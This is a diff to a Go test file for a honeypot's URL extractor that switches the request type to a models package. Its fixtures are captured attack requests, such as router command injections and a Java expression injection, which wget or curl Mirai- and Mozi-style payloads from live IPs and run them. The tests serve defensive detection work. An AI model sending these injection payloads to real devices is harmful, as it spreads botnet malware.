@@ -18,7 +18,7 @@ package extractors
 
 import (
 	"fmt"
-	"lophiid/pkg/database"
+	"lophiid/pkg/database/models"
 	"lophiid/pkg/util/constants"
 	"testing"
 )
@@ -90,13 +90,13 @@ func TestExtractUrls(t *testing.T) {
 func TestURLExtractor(t *testing.T) {
 	for _, test := range []struct {
 		description string
-		request     database.Request
+		request     models.Request
 		urlsToFind  []string
 	}{
 		{
 			description: "Find URL in body",
 			urlsToFind:  []string{"http://www.example.org/"},
-			request: database.Request{
+			request: models.Request{
 
 				Uri:        "/ignored?aa=bb",
 				Raw:        "nothing",
@@ -107,7 +107,7 @@ func TestURLExtractor(t *testing.T) {
 		{
 			description: "Ignores honeypot IP",
 			urlsToFind:  []string{},
-			request: database.Request{
+			request: models.Request{
 				Uri:        "/ignored?aa=bb",
 				Raw:        "nothing",
 				Body:       []byte("dsd http://1.1.1.1/ fd"),
@@ -117,7 +117,7 @@ func TestURLExtractor(t *testing.T) {
 		{
 			description: "Find URL in body (no encoding header)",
 			urlsToFind:  []string{"http://115.55.237.117:51813/Mozi.m"},
-			request: database.Request{
+			request: models.Request{
 				Uri:        "/ignored?aa=bb",
 				Raw:        "ssadsa",
 				Body:       []byte("XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=``;wget+http://115.55.237.117:51813/Mozi.m+-O+->/tmp/gpon80"),
@@ -127,7 +127,7 @@ func TestURLExtractor(t *testing.T) {
 		{
 			description: "Find URL in body (encoded)",
 			urlsToFind:  []string{"http://192.210.162.147/arm7"},
-			request: database.Request{
+			request: models.Request{
 				Uri:        "/ignored?aa=bb",
 				Raw:        "ssadsa application/x-www-form-urlencoded ds",
 				Body:       []byte("remote_submit_Flag=1&remote_syslog_Flag=1&RemoteSyslogSupported=1&LogFlag=0&remote_host=%3bcd+/tmp;wget+http://192.210.162.147/arm7;chmod+777+arm7;./arm7 zyxel;rm+-rf+arm7%3b"),
@@ -137,7 +137,7 @@ func TestURLExtractor(t *testing.T) {
 		{
 			description: "Find URL in body (not encoded, with semi colon)",
 			urlsToFind:  []string{"http://1.2.3.4/arm7"},
-			request: database.Request{
+			request: models.Request{
 
 				Uri:        "/ignored?aa=bb",
 				Raw:        "ssadsads",
@@ -148,7 +148,7 @@ func TestURLExtractor(t *testing.T) {
 		{
 			description: "Find URL in query string",
 			urlsToFind:  []string{"94.103.87.71/cf.sh"},
-			request: database.Request{
+			request: models.Request{
 
 				Uri:        "/$%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27,%27-c%27,%27%28curl%20-s%2094.103.87.71/cf.sh%7C%7Cwget%20-q%20-O-%2094.103.87.71/cf.sh%29%7Cbash%27%29.start%28%29%22%29%7D/ ",
 				Raw:        "ssadsads",
@@ -159,7 +159,7 @@ func TestURLExtractor(t *testing.T) {
 		{
 			description: "Find URL in query param name",
 			urlsToFind:  []string{"http://64.83.132.82/malware/mirai.sh"},
-			request: database.Request{
+			request: models.Request{
 
 				Uri:        "/shell?cd%20%2Ftmp%3B%20wget%20http%3A%2F%2F64.83.132.82%2Fmalware%2Fmirai.sh%3B%20sh%20mirai.sh",
 				Raw:        "ssadsads",
@@ -171,7 +171,7 @@ func TestURLExtractor(t *testing.T) {
 		{
 			description: "Find URL in query string (not encoded)",
 			urlsToFind:  []string{"http://45.86.155.249/bestone/.nekoisdaddy.mips"},
-			request: database.Request{
+			request: models.Request{
 
 				Uri:        "/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://45.86.155.249/bestone/.nekoisdaddy.mips+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1",
 				Raw:        "ssadsads",
@@ -182,7 +182,7 @@ func TestURLExtractor(t *testing.T) {
 		{
 			description: "Find URL in body with + string",
 			urlsToFind:  []string{"http://185.225.73.177/arm7"},
-			request: database.Request{
+			request: models.Request{
 
 				Uri:        "/",
 				Raw:        "ssadsads Content-Type: application/x-www-form-urlencoded U",
@@ -193,7 +193,7 @@ func TestURLExtractor(t *testing.T) {
 		{
 			description: "Find URL in encoded body without urlencoded header",
 			urlsToFind:  []string{"http://104.168.5.4/forti.sh"},
-			request: database.Request{
+			request: models.Request{
 
 				Uri:        "/",
 				Raw:        "",
